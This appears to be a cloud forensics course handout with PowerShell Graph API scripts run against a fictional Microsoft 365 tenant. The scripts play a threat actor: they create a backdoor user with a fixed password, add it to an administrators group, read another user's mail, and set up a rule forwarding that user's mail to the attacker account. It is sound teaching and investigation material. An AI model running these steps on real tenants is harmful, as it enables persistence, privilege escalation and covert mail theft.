Graph API is an extremely powerful way to interact with the Microsoft 365 cloud. 

We selected a few of example that you may find interesting and provide the PowerShell code used to generate the Graph API calls.
We hope that you can use this code to learn more about Graph API and leverage its power in your own environment.

To issue this Graph API calls, you must have an existing application defined and approved as well as an associated secret (ie. password).


### Explore the Graph API


***Install the authentication library PowerShell module***
    ```
    Install-Module -Name MSAL.PS -RequiredVersion 4.2.1.3 -Scope CurrentUser
    ```
    For more information, see https://www.powershellgallery.com/packages/MSAL.PS/4.2.1.3

***Request a token***  
Prior to issuing a Graph API call, you must request a token. This code will be at the start of your session and must be re-issued once the token expires.
    ```
    $tenantId = "<name of your tenant>"
    $clientID = "<application id>"
    $clientSecret = (ConvertTo-SecureString "<application secret>" -AsPlainText -Force )
    $Scope = "https://graph.microsoft.com/.default"
    $authToken = Get-MsalToken -ClientId $clientID -ClientSecret $clientSecret -TenantId $tenantId -Scopes $Scope
    $Headers = @{
            "Authorization" = "Bearer $($authToken.AccessToken)"
            "Content-type"  = "application/json"
		    "Prefer"        = "outlook.body-content-type='text'"
        }   
    ```

***Create a user***  
    Permissions required: `User.ReadWrite.All` and `Directory.ReadWrite.All`
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users"
    $usr = @{
    "userPrincipalName"="Hydra@pymtechlabs.com"
    "displayName"="Hydra"
    "mailNickname"="Hydra"
    "accountEnabled"="true"
    "passwordProfile"= @{
        "forceChangePasswordNextSignIn" = "false"
        "forceChangePasswordNextSignInWithMfa" = "false"
        "password"="HdrwillNev3rdie!"
        }
    } | ConvertTo-Json
 
    $result = Invoke-RestMethod -Uri $apiUri -Headers $Headers -Method POST -ContentType "application/json" -Body $usr
	$result
    ```

***Get list of users***
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users/"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $users = ($response | Select-Object Value).Value 
    $users | Format-Table displayName, userPrincipalname, id
    ```

Sample output from the FOR509 class. You will need the id of your targeted user for future steps.
    ```
    displayName    userPrincipalName          id
    -----------    -----------------          --
    Hank Pym       admin@pymtechlabs.com      675be0f4-2486-4443-bef6-d37d9043ae99
    Hydra          Hydra@pymtechlabs.com      a32bd224-fa32-493f-9301-ca9aeb596fdc
    Janet Van Dyne JVanDyne@pymtechlabs.com   76362af6-e38a-41e7-adab-e21ad7e23a20
    ```

***Get list of groups***
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/groups"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $groups = ($response | Select-Object Value).Value 
    $groups | Format-Table displayName,id
    ```

Sample output from the FOR509 class. You will need the id of the targeted group.
    ```
    displayName           id
    -----------           --
    MFA Users             0727a4c3-ea16-4dcf-a0da-083109e513b5
    EW                    24b27528-e062-467d-a911-8665f10b3c8d
    RescuePlan            2e6b56d6-0136-4d39-9308-322be3ea1801
    AAD DC Administrators a862b324-6af9-4cd1-a8f2-e3289aa8bc9d
    Pym Tech Labs         bce367dd-e1e4-4454-b652-ad846f67c5fb
    All Company           ebb67aa0-3ce5-4e76-a1ce-b74b4b64949f
    ```

***Add Hydra@pymtechlabs.com to the AAD DC Administrators group***
    ```
    $body = [ordered]@{
    "@odata.id"="https://graph.microsoft.com/v1.0/users/Hydra@pymtechlabs.com"
    } | ConvertTo-Json

    $apiUri = "https://graph.microsoft.com/v1.0/groups/a862b324-6af9-4cd1-a8f2-e3289aa8bc9d/members/`$ref"
	Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method POST -ContentType "application/json" -Body $body
    ```

***Get list of Janet's email***  
Permission required: `Mail.Read`
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/messages"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $Emails = ($response | Select-Object Value).Value
    $Emails | Select-Object  @{Name = 'From'; Expression = {(($_.sender).emailaddress).name}}, @{Name = 'To'; Expression = {(($_.toRecipients).emailaddress).name}}, subject, hasattachments, isRead

    $Emails | Select-Object -ExpandProperty id
    ```

***Create a calendar event in Janet's calendar***  
Permission required: `Calendars.ReadWrite`
    ```
    $body = @{
        "subject"="FOR509 Class"
        "body"= @{
        "contentType"="HTML"
        "content"="Enterprise Cloud Forensics and Incident Response"
    }
    "start"= @{
        "dateTime"="2021-08-13T08:00:00"
        "timeZone"="Pacific Standard Time"
    }
    "end"= @{
        "dateTime"="2021-08-17T08:00:00"
        "timeZone"="Pacific Standard Time"
    }
    "location"= @{
        "displayName"="LiveOnline"
    }
    "attendees"= @( @{
        "emailAddress"= @{
	        "address"="JVanDyne@pymtechlabs.com"
		    "name"="Janet Van Dyne"
		}
        "type"="Required"
    }
    )
    "allowNewTimeProposals"= "false"
    "isOnlineMeeting"= "true"
     "onlineMeetingProvider"="teamsForBusiness"
    } | ConvertTo-Json -Depth 100

    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/calendar/events"
    Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method POST -ContentType "application/json" -Body $body
    ```

***List calendar events***
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/calendar/events"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $Events = ($response | Select-Object Value).Value 
    $Events | Format-Table subject,start    
    ```

***Create a contact***  
Permission required: `Contacts.ReadWrite`
    ```
    $body = @{
        "givenName"="Pierre"
	    "surname"="Lidome"
        "emailAddresses"= @( @{
            "address"="plidome@sans.org"
	        "name"="Pierre Lidome"
        }   
    )
    "businessHomePAge"= "@texaquila"
    } | ConvertTo-Json -Depth 100

    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/contacts"
	$response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method POST -ContentType "application/json" -Body $body
    ```

***List contacts to make sure the new contact was created***
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/contacts"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $contacts = ($response | Select-Object Value).Value 
    $contacts | Format-Table displayName,businessHomePage,emailAddresses
    ```

***Create a message rule to forward Janet's email sent by Hank to Hydra's email***  
Permission required: `MailboxSettings.ReadWrite`
    ```
    $body = @{
        "displayName"="To threat actor"
	    "sequence"="2"
	    "isEnabled"="true"
	    "conditions"= @{
	        "senderContains"= @(
	            "admin"
		    )
	    }
	"actions"= @{
	    "forwardTo"= @(
	    @{
	       "emailAddress"= @{
		      "name"="Hydra"
			  "address"="hydra@pymtechlabs.com"
			}
		}
		)
	    "stopProcessingRules"="true"
	}
    } | ConvertTo-Json -Depth 100

    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/mailFolders/inbox/messageRules"
    Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method POST -ContentType "application/json" -Body $body
    ```

***List rules to verify the new rule was created***
    ```
    $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/mailFolders/inbox/messageRules"
    $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
    $response.value
    ```

***Change profile picture (must be less than 100kb)***  
    ```
    $UPN="Hydra@pymtechlabs.com"
    $Photo="C:\pictures\hydra.jpg"
    $URLPhoto = "https://graph.microsoft.com/v1.0/users/$UPN/photo/$value" 
    Invoke-WebRequest -uri $URLPhoto -Headers $Headers -Method PUT -Infile $Photo -ContentType 'image/jpg'
    ```


## Key Takeaways

- Graph API is very powerfull but not everything is logged
- Even when logs are available they may provide insufficient information for our investigation
- Be very careful what permissions you give to an app
- Be sure to safeguard credentials to these apps
- Logs show that all accesses originate from Microsoft IP addresses making it very difficult to track threat actors
